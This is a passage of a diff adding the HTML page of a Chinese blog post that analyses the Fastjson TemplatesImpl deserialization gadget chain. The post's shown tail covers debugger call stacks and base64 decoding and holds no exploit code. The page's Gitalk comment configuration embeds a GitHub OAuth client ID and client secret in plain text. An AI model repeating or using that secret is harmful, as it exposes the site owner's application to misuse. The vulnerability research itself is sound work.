src="https://i-blog.csdnimg.cn/blog_migrate/d3215dd01bbd53746fc3e26adf1b66cd.png" alt="在这里插入图片描述"></p>
+<p>进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/da541b6fc0351c2fccfda9e480cb0b7d.png" alt="在这里插入图片描述"></p>
+<p>这儿实例化了一个对象，会调用构造方法，跟进去就到了这里：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/74de1d2ca82ad454088850b963d7ff36.png" alt="在这里插入图片描述"><br>后面的过程就和我们开始的分析一样了，完整的调用栈：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a35f9036a8fd9caeeb4c5e8b3f1d88cd.png" alt="在这里插入图片描述"><br>说道这里还是没有讲为什么要base64编码，也是原作者锅，狗头保命。当token等于4的时候，会调用lexer.bytesValue<br><img src="https://i-blog.csdnimg.cn/blog_migrate/432d562f7dec5775315372382631e7fc.png" alt="在这里插入图片描述"><br>我们知道lexer对象是通过JSONScanner生成的，所以我们要到JSONScanner类里面去找bytesValue：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/930a4b463d3a7cd04ca8c2fc6c8a8d58.png" alt="在这里插入图片描述"><br>这里调用了base64的解码函数。<br>最后跟的有点水，因为我也有点没有跟明白！！！！</p>
+
+    </div>
+
+    
+    
+    <div class="post-widgets">
+      <div id="needsharebutton-postbottom">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    </div>
+        <div class="reward-container">
+  <div>Buy me a coffee.</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="Arliya 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Arliya 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Arliya
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://dayutech.github.io/archives/4187a059.html" title="Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析">https://dayutech.github.io/archives/4187a059.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
+              <a href="/tags/fastjson/" rel="tag"><i class="fa fa-tag"></i> fastjson</a>
+              <a href="/tags/gadgets/" rel="tag"><i class="fa fa-tag"></i> gadgets</a>
+              <a href="/tags/templateImpl/" rel="tag"><i class="fa fa-tag"></i> templateImpl</a>
+          </div>
+		  
+          <script data-pjax>
+	var tagsall=document.getElementsByClassName("post-tags")
+	for (var i = tagsall.length - 1; i >= 0; i--){
+		var tags=tagsall[i].getElementsByTagName("a");
+		for (var j = tags.length - 1; j >= 0; j--) {
+			var golden_ratio = 0.618033988749895;
+			var s = 0.5;
+			var v = 0.999;
+			var h = golden_ratio + Math.random()*0.8 - 0.5;
+			var h_i = parseInt(h * 6);
+			var f = h * 6 - h_i;
+			var p = v * (1 - s);
+			var q = v * (1 - f * s);
+			var t = v * (1 - (1 - f) * s);
+			var r, g, b;
+			switch (h_i) {
+				case 0:
+					r = v;
+					g = t;
+					b = p;
+					break;
+				case 1:
+					r = q;
+					g = v;
+					b = p;
+					break;
+				case 2:
+					r = p;
+					g = v;
+					b = t;
+					break;
+				case 3 :
+					r = p;
+					g = q;
+					b = v;
+					break;
+				case 4:
+					r = t;
+					g = p;
+					b = v;
+					break;
+				case 5:
+					r = v;
+					g = p;
+					b = q;
+					break;
+				default:
+					r = 1;
+					g = 1;
+					b = 1;
+			  }
+			tags[j].style.background = "rgba("+parseInt(r*255)+","+parseInt(g*255)+","+parseInt(b*255)+","+0.5+")";
+		}
+	}          
+                         
+            </script>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/archives/9d7d8426.html" rel="prev" title="Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】">
+      <i class="fa fa-chevron-left"></i> Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/archives/38dceb78.html" rel="next" title="Fastjson反序列化漏洞原理分析及复现">
+      Fastjson反序列化漏洞原理分析及复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <!-- needsharebutton Javascript file -->
+<script src="js/needsharebutton.min.js"></script>
+<!-- needsharebutton CSS file -->
+<link href="css/needsharebutton.min.css" rel="stylesheet" />
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Arliya"
+      src="/images/dayu/avatar.png">
+  <p class="site-author-name" itemprop="name">Arliya</p>
+  <div class="site-description" itemprop="description">主要从事Web漏洞挖掘工作，涉猎编程语言包括Java、Scala、C/C++、PHP、Python、C#、Golang，涉及领域包括Web以及二进制漏洞挖掘，二进制比较菜，平时喜欢在金融市场消费</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">190</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/dayutech" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;dayutech" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:test@qq.com" title="E-Mail → mailto:test@qq.com" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/yourname" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;yourname" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://youtube.com/yourname" title="YouTube → https:&#x2F;&#x2F;youtube.com&#x2F;yourname" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-youtube fa-fw"></i>YouTube</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener external nofollow noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+	  
+		<div class="links-of-blogroll scroll" style="margin-top:20px; border-style:dotted none none none; padding-top:5px; text-align:left;padding-left: 20px; padding-right: 10px; padding-bottom: 5px;">
+		  <div class="links-of-blogroll-title" style="padding-bottom: 5px; padding-top: 5px; padding-left: 0px; padding-right: 20px; font-size: 1.6em; argin-right: 5px;">
+		<!-- 选择合适的icon --><i class="fab fa-markdown" aria-hidden="true"></i>
+			<b style="font-size: 0.65em; padding-left: 8px; position: relative; top: -2px;">文章列表</b>
+		  </div>
+		  <ul class="links-of-blogroll-list">
+		<!-- 文章排序规格,-updated 按照文章更新时间倒排 -->
+			
+		<!-- 显示10数目的文章 -->
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/42eb2c82.html" title="动态代理在java反序列化中的应用" target="_blank">动态代理在java反序列化中的应用</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/b7f3ad9b.html" title="面试题整理" target="_blank">面试题整理</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/9c75190f.html" title="防火墙" target="_blank">防火墙</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/42623881.html" title="通过Tomcat BeanFactory 绕过高版本JDK CodeBase限制实现JNDI注入" target="_blank">通过Tomcat BeanFactory 绕过高版本JDK CodeBase限制实现JNDI注入</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/6eecc4bb.html" title="读书笔记-WEB前端黑客技术揭秘" target="_blank">读书笔记-WEB前端黑客技术揭秘</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/ef2b93c5.html" title="记一次Pyppeteer调试解决--Browser closed unexpectedly--的问题" target="_blank">记一次Pyppeteer调试解决--Browser closed unexpectedly--的问题</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/53e2963.html" title="解决hexo图片访问遇到图床防盗链无法访问的问题" target="_blank">解决hexo图片访问遇到图床防盗链无法访问的问题</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/7f771bb5.html" title="解决hexo内嵌js无法加载问题" target="_blank">解决hexo内嵌js无法加载问题</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/e9ccef3c.html" title="解决hexo-pdf无法使用的问题" target="_blank">解决hexo-pdf无法使用的问题</a>
+			  </li>
+			
+			  <li class="postsSidebarNumb" style="text-indent: -1em;">
+				<a href="/archives/cf1ba47f.html" title="解决hexo-next主题上游仓库改变告警" target="_blank">解决hexo-next主题上游仓库改变告警</a>
+			  </li>
+			
+		  </ul>
+		</div>
+	  
+	 
+    </div>
+	
+  </aside>
+  <div id="sidebar-dimmer"></div>
+ 
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Arliya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">202k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">12:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://github.com/dayutech" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">DayuTech</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+<div id="needsharebutton-float">
+      <span class="btn">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </span>
+    </div>
+  <script src="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.js"></script>
+  <script>
+      pbOptions = {};
+        pbOptions.iconStyle = "box";
+        pbOptions.boxForm = "horizontal";
+        pbOptions.position = "bottomCenter";
+        pbOptions.networks = "Wechat,QQZone,Weibo,Douban,Twitter,Facebook";
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+      flOptions = {};
+        flOptions.iconStyle = "box";
+        flOptions.boxForm = "horizontal";
+        flOptions.position = "middleRight";
+        flOptions.networks = "Wechat,QQZone,Weibo,Douban,Twitter,Facebook";
+      new needShareButton('#needsharebutton-float', flOptions);
+  </script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li28mRRYx9D76aAJ',
+      clientSecret: '8f7211d1bd039050ed40345ddf60273d6626ad6f',
+      repo        : 'dayutech.github.io',
+      owner       : 'dayutech',
+      admin       : ['dayutech'],
+      id          : '5bf3e8b876c8b76921ac92cd4089daf8',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+<style>
+#custom_bar {
+  float: right;
+  font-style: italic;
+  background-color: lightgray;
+  position: fixed;
+  top: 20%;
+  right: 50px;
+  box-shadow: 15px 10px 10px gray;
+}
+/* 新年侧边栏 */
+#newYear {
+  color: white;
+  padding: 0 !important;
+}
+
+#newYear p,
+#newYear h3 {
+  font-weight: normal;
+  color: inherit;
+  margin: 0;
+}
+
+#newYear .item-headline {
+  display: none;
+}
+
+.newYear-slider {
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 100%;
+}
+
+.newYear-slider .swiper-slide {
+  min-height: 160px;
+  min-width: 210px;
+  background-size: cover;
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 100%;
+}
+
+#newYear-main {
+  width: 100%;
+  pointer-events: none;
+  padding: 1rem;
+  position: relative;
+  left: 0;
+  top: 0;
+  z-index: 1;
+}
+
+#newYear-main * {
+  position: relative;
+  line-height: 1.3;
+}
+
+#newYear-main .time,
+#newYear-main .happyNewYear {
+  font-size: 3rem;
+  margin: 8px 0;
+  display: block;
+}
+
+#newYear-main .newYear-time {
+  font-weight: bold;
+  text-align: center;
+}
+
+#newYear-main .day {
+  font-size: 4rem;
+  letter-spacing: 6px;
+  margin-right: -6px;
+}
+
+#newYear-main .unit {
+  font-size: 1rem;
+}
+
+#newYear-main .mask {
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 100%;
+  background-color: rgba(0, 0, 0, .2);
+}
+
+[data-theme=dark] #newYear-main .mask {
+  background-color: rgba(0, 0, 0, .3);
+}
+</style>
+<link data-pjax rel="stylesheet" href="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/Swiper/8.0.6/swiper-bundle.min.css">
+<aside id="custom_bar">
+    <div id="newYear">
+        <div class="newYear-slider">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide" style="background-image:url(/images/ma1.jpg)"></div>
+                <div class="swiper-slide" style="background-image:url(/images/ma2.jpg)"></div>
+                <div class="swiper-slide" style="background-image:url(/images/ma3.jpg)"></div>
+                <div class="swiper-slide" style="background-image:url(/images/ma4.jpg)"></div>
+            </div>
+        </div>
+        <div id="newYear-main">
+            <div class="mask"></div>
+            <p class="title"></p>
+            <div class="newYear-time"></div>
+            <p class="today" style="text-align: right;"></p>
+        </div>
+    </div>
+</aside>
+<script data-pjax src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/Swiper/8.0.6/swiper-bundle.min.js"></script>
+<script data-pjax>
+    function newYear() {
+    if (!document.querySelector('#newYear')) return;
+    // 新年时间戳 and 星期对象
+    let SpringFestival = new Date('2026-02-17 00:00:00')
+    let newYear = SpringFestival.getTime() / 1000,
+        week = { 0: '周日', 1: '周一', 2: '周二', 3: '周三', 4: '周四', 5: '周五', 6: '周六' }
+    function nol(h) { h = Number(h); return h > 9 ? h : '0' + h; }
+    time();
+
+    function time() {
+        // 现在 时间对象
+        let now = new Date();
+
+        // 右下角 今天
+        document.querySelector('#newYear .today').innerHTML = now.getFullYear() + '-' + (now.getMonth() + 1) + '-' + now.getDate() + ' ' + week[now.getDay()]
+
+        // 现在与新年相差秒数
+        let second = newYear - Math.round(now.getTime() / 1000);
+
+        // 小于0则表示已经过年
+        if (second < 0) {
+        window.newYearTimer = null
+        document.querySelector('#newYear .title').innerHTML = 'Happy New Year!';
+        document.querySelector('#newYear .newYear-time').innerHTML = '<span class="happyNewYear">新年快乐</span>';
+        } else {
+        // 大于0则还未过年
+        document.querySelector('#newYear .title').innerHTML = '距离' + SpringFestival.getFullYear() + '年春节：'
+        // 大于一天则直接渲染天数
+        if (second > 86400) {
+            document.querySelector('#newYear .newYear-time').innerHTML = `<span class="day">${Math.ceil(second / 86400)}</span><span class="unit">天</span>`
+        } else {
+            // 小于一天则使用时分秒计时。
+            let h = nol(parseInt(second / 3600));
+            second %= 3600;
+            let m = nol(parseInt(second / 60));
+            second %= 60;
+            let s = nol(second);
+            document.querySelector('#newYear .newYear-time').innerHTML = `<span class="time">${h}:${m}:${s}</span></span>`;
+            // 计时
+            if (!window.newYearTimer) window.newYearTimer = setInterval(time, 1000);
+        }
+        }
+    }
+    }
+
+    function newYearSwiper() {
+    var swiper = new Swiper('.newYear-slider', {
+        passiveListeners: true,
+        loop: true,
+        // autoplay: false,
+        autoplay: {
+        disableOnInteraction: true,
+        delay: 5000
+        },
+        effect: 'fade',
+        mousewheel: true,
+        autoHeight: true
+    });
+
+    var comtainer = document.querySelector('.newYear-slider');
+    if (comtainer !== null) {
+        comtainer.onmouseenter = () => { swiper.autoplay.stop() };
+        comtainer.onmouseleave = () => { swiper.autoplay.start() };
+    }
+    }
+
+    // 适配了pjax
+    function whenDOMReady() {
+    // pjax加载完成（切换页面）后需要执行的函数和代码
+    newYear()
+    newYearSwiper()
+    }
+
+    whenDOMReady() // 打开网站先执行一次
+    document.addEventListener("pjax:complete", whenDOMReady) // pjax加载完成（切换页面）后再执行一次
+</script>
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
